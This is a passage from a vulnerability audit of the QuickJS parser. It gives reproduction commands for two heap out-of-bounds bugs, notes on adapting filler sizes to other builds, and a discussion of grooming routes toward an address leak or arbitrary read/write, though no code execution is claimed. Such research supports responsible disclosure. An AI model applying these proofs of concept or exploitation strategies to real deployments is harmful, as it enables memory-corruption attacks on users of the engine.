  own* 0xFF literal allocated right after the table (`logs/c2_ff_*`), which
  is data-only and is freed with the failed compile.
* **The compile still cannot complete.** F2 lets JS continue after the
  failed compile, but the compile itself cannot recover: the vardefs copy is
  ~6x the failed-grow delta (§4.6), and no allocation inside the compiler
  triggers a GC that could free the fill. The observable state after the
  catch is therefore only what the OOB write already damaged during
  `add_eval_variables()`/`resolve_variables()`.

Artifacts: `poc/f2_probe.js`, `poc/gen_c2_f2.py`,
`poc/gen_c2_f2_arr.py`, `poc/gen_c2_f2_arr2.py`,
`logs/c2_f2_probe.log`, `logs/c2_f2_trace.log`.

## 5. Reviewed and rejected / negative results

* **#1782 (truncated `byte_code`)** — reproduced in passing; deduped, not
  claimed. The `dbuf_error()` check proposed there would not catch C1/C2.
* **N1 (`push_scope` failure)** — previously reported by this project;
  deduped. Not re-tested here.
* **Closure OOM (`get_closure_var` → -1)** — previously reported; deduped.
  C2 is a different array (`vars_htab`) and index.
* **`resolve_labels()` `bc_out` OOM (`add_reloc(ctx, ls, bc_out.size - 4, 4)`
  with `bc_out.size < 4`)** — code-reading candidate: after the first
  `dbuf_putc()` failure the buffer is `NULL`/size 0, so `add_reloc` receives
  `0xFFFFFFFC` and the later `put_u32(bc_out.buf + re->addr, diff)` writes at
  `NULL + 0xFFFFFFFC`. This is a fixed-address wild write / crash, not a
  controllable primitive; not reproduced because it is DoS-only and outside
  the acceptance rule. Worth reporting as a robustness issue.
* **`emit_atom()` / `emit_push_const()` OOM** — atom-reference leaks on
  failure (also mentioned by the #1782 author), no memory corruption.
* **`jump_slots` sizing** — counted in `resolve_variables()` and consumed in
  `resolve_labels()`; all emission paths reviewed (gosub/lnot/dup/dispose
  transformations) and the count is an over-estimate, not an under-estimate.
  No `jump_count > jump_size` found.
* **Class-field `ctor_cpool_offset` patch** — `put_u32(fd->byte_code.buf +
  ctor_cpool_offset, ...)` is safe on the parser path: `fd->byte_code` only
  grows during class parsing and the offset/index belong to the same `fd`.
  The unchecked `cpool_add()` in `emit_class_init_end()` is C1.
* **`free_bytecode_atoms()` on a truncated buffer** — reviewed; the
  `pos + 1 + 4 > bc_len` guard prevents reading past the buffer, and a
  mis-parsed trailing instruction can only free an atom that was actually
  written. No double-free found.
* **`resolve_scope_var()`/`resolve_pseudo_var()` OOM** — failed `add_var`
  leaves `*_var_idx = -1` and all uses are guarded by `>= 0`; unlike the
  closure index, no unguarded emit.
* **`update_var_htab()` NULL table** (`vars_htab` never allocated because the
  first grow failed) — next insert writes at `NULL + 4*(i & mask)`, a
  low-address crash. Same family as C2, strictly worse primitive; no separate
  report.
* **16-bit scope-index truncation above 65535 scopes** — `push_scope()` has
  the "XXX: should check for scope overflow" comment and emits the scope
  index with `emit_u16()`. Tested non-OOM on both the arena and ASan builds:
  `{}` repeated 65,600/70,000 times inside a function, plus a final block
  with a `let` captured by a closure. Both builds compile and run (`G()`
  returns the captured value, `typeof y` stays `"undefined"`), no ASan
  report, no crash. The truncated index still lands inside `fd->scopes[]`
  because `scope_count` is larger than 65536, and the compiler's fallback
  lookup keeps the binding correct; a semantic corner case, not a memory
  bug in this shape. Artifacts: `poc/scope_*.js`.
* **F2 (regexp worker's finding)** — reused, not claimed; see §4.7 and the
  dedup table.

## 6. Can the primitives become arbitrary read/write?

Summary of what is actually controlled:

| | value written | address | control | survives cleanup |
|---|---|---|---|---|
| C1 `cpool[-1]` | child `JSFunctionBytecode *` + tag `-2` | `cpool - 16` | fixed offset; pool size/position partially shapeable | no: the corrupted block is freed, `js_arena_free` computes a wild `ar` and faults (Scudo), glibc aborts on the chunk header |
| C2 htab insert | small var index (`k`) | `htab + 4*(hash & (2*cap-1))` | value selectable via `n`; offset hash-fixed per atom; write only if slot == `0xFFFFFFFF` | clean on Scudo/arena (no crash, §4.6); the compile still aborts; F2 lets JS catch the OOM, but no live-object adjacency was landed (§4.7) |
| C2 find_var | — (read) | `fd->vars + 20 * (garbage u32)` | garbage u32 is heap data; groomable in principle | no: the compile cannot finish |

The realistic next steps, in order of promise:

1. **C1 as an address leak into live data.** Make the cpool buffer a *small*
   arena block (pool capacity 1..3) so the pointer half overwrites the last
   8 bytes of the preceding arena block. If that preceding block is a JS
   string whose bytes are later read, the pointer becomes a float64 bit
   pattern. Blocker: the cpool is freed in the same cleanup and the corrupted
   header makes `js_arena_free` fault first. A variant would have to put the
   corrupted block at the end of an arena so the `ar` computation reads from
   a mapped page and the free list survives; `arena_block_sizes[0xFF]` is a
   build constant that can be checked in the target `.so`.
2. **C2 as a bytecode-index corruption.** Groom the arena block after the
   htab with attacker bytes so `find_var_htab()` reads a chosen small `*p`
   that matches a chosen variable's atom. The compiler would then emit a
   chosen 16-bit local index. Blocker: the OOM abort. If a future code change
   makes the compiler tolerate the failed grow (or frees a large temporary
   before `js_create_function()`), this becomes a direct `var_buf` OOB
   read/write of a JSValue.
3. **C1 with a large pool and a following live object.** The 8 bytes
   *before* a large malloc block are chunk metadata, so this needs an
   allocator that puts user data there (the quickjs arena does for small
   blocks only). No route found that avoids the free.

No RCE is claimed for either bug.

## 7. Reproduction

```bash
cd lab/qjs_parser_audit
./build_all.sh                     # builds src/ (e22ce4d) in build/

# C1: ASan OOB write, 5/5
python3 poc/gen_cpool.py 6184000 211 poc/c1_k211_release_asan.js
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
  ./build/run6m_rel-asan poc/c1_k211_release_asan.js      # heap-buffer-overflow WRITE 16

# C1: debug assertion (cpool_idx = -1)
python3 poc/gen_cpool.py 6176320 211 poc/c1_k211_debug_assert.js
ASAN_OPTIONS=detect_leaks=0 ./build/run6m_dbg-asan poc/c1_k211_debug_assert.js
#   Assertion `cpool_idx >= 0' failed (quickjs.c:37082)

# C1: app model (glibc arena / Scudo)
python3 poc/gen_cpool.py 6178000 211 poc/c1_k211_plain.js
./build/run6m_rel poc/c1_k211_plain.js       # free(): invalid next size (normal)
python3 poc/gen_cpool.py 6180616 211 poc/c1_k211_scudo.js
./build/run6m_scudo poc/c1_k211_scudo.js     # SIGSEGV in js_arena_free

# C2: ASan OOB read
python3 poc/gen_htab2.py 6187888 52 0 poc/c2_htab_asan.js
ASAN_OPTIONS=detect_leaks=0:abort_on_error=1 \
  ./build/run6m_rel-asan poc/c2_htab_asan.js  # heap-buffer-overflow READ 4

# C2: app model (glibc arena / Scudo)
python3 poc/gen_htab2.py 6183072 52 0 poc/c2_htab_arena.js
./build/run6m_rel poc/c2_htab_arena.js        # SIGSEGV in find_var
python3 poc/gen_htab2.py 6184968 52 0 poc/c2_htab_scudo.js
./build/run6m_scudo poc/c2_htab_scudo.js      # SIGSEGV in find_var_htab

# C2: clean non-crashing OOB write (0xFF filler + fine 0; knob)
python3 poc/gen_htab_ff2.py 6127552 600 220 51 poc/c2_ff_scudo.js 8
./build/run6m_scudo poc/c2_ff_scudo.js        # rc=2, uncatchable OOM, no crash
./build/run6m_scudo_instr poc/c2_ff_scudo.js  # UVH_GROW ok=0 + 3 UVH_OOB_WRITE

# F2: catchable bare-null OOM and catch-the-compile-OOM
./build/run6m_rel poc/f2_probe.js             # OK: 11
python3 poc/gen_c2_f2.py 51540 8 51 poc/c2_f2_catch.js
./build/run6m_rel poc/c2_f2_catch.js          # fo=0, r=1: compile OOM caught as null
```

The filler windows above are host-build specific. On the app commit/ABI the
runtime baseline differs by a few KiB; sweep `F` in 8-byte steps around the
transition (`poc/sweep.sh`) until the crash appears.

## 8. Artifacts

```
lab/qjs_parser_audit/
  notes -> ../../notes/audit_parser.md          (this report)
  build_all.sh                                  reproducible builds
  build_instr.sh, instr_update_var_htab.patch   evidence-only instrumented build
  build_scudo.sh                                clang+Scudo app-model builds
  harness/run6m.c                               6 MiB app-model harness
  poc/gen_cpool.py                              C1 generator (K must be a capacity)
  poc/gen_htab.py, poc/gen_htab2.py             C2 generators (with/without pre-intern)
  poc/gen_htab_ff2.py                           C2 0xFF filler + fine `0;` knob
  poc/gen_c2_f2.py, poc/gen_c2_f2_arr.py,
  poc/gen_c2_f2_arr2.py                         F2 catch + live-object shaping attempts
  poc/f2_probe.js                               F2 catchable-OOM reproduction
  poc/sweep.sh                                  filler sweep
  poc/c1_k211_release_asan.js, c1_k211_debug_assert.js,
  poc/c1_k211_plain.js, c1_k211_scudo.js        fixed C1 PoCs
  poc/c2_htab_asan.js, c2_htab_arena.js,
  poc/c2_htab_scudo.js                          fixed C2 PoCs
  logs/c1_rel_asan_run1.log, c1_rel_asan.txt ASan WRITE evidence
  logs/c1_gdb_assert.txt                        cpool_idx=-1 / parent_cpool_idx=-1
  logs/c1_plain.txt, c1_plain_gdb.txt           glibc arena abort
  logs/c1_scudo.txt, c1_scudo_gdb.txt           Scudo SIGSEGV in js_arena_free
  logs/c2_rel_asan.txt                          ASan READ evidence
  logs/c2_instr_arena.txt                       failed grow + OOB probe log (arena)
  logs/c2_plain_gdb.txt                         glibc arena SIGSEGV in find_var_htab
  logs/c2_instr_arena_gdb.txt                   instrumented arena SIGSEGV in find_var
  logs/c2_scudo.txt, c2_scudo_gdb.txt           Scudo SIGSEGV in find_var_htab
  logs/c2_ff_arena_k8.txt, c2_ff_scudo_k8.txt   clean failed grow + 3 OOB writes
  logs/c2_ff_k8.txt                             earlier clean-write log
  logs/c2_f2_probe.log, c2_f2_trace.log         F2 catch + class-288 tracing
  poc/c2_ff_scudo.js                            clean-write PoC (Scudo)
  poc/c2_f2_catch.js                            catchable compile-OOM PoC
```

Logs are from the exact commands in §7; the Sanitizer reports include the full
allocation stacks. `src/` is a pristine checkout of `e22ce4d` (no local
patches); `src_instr/` is a scratch copy that only adds `fprintf` logging to
`update_var_htab()` for the arena-accounting evidence and is not used for any
PoC.
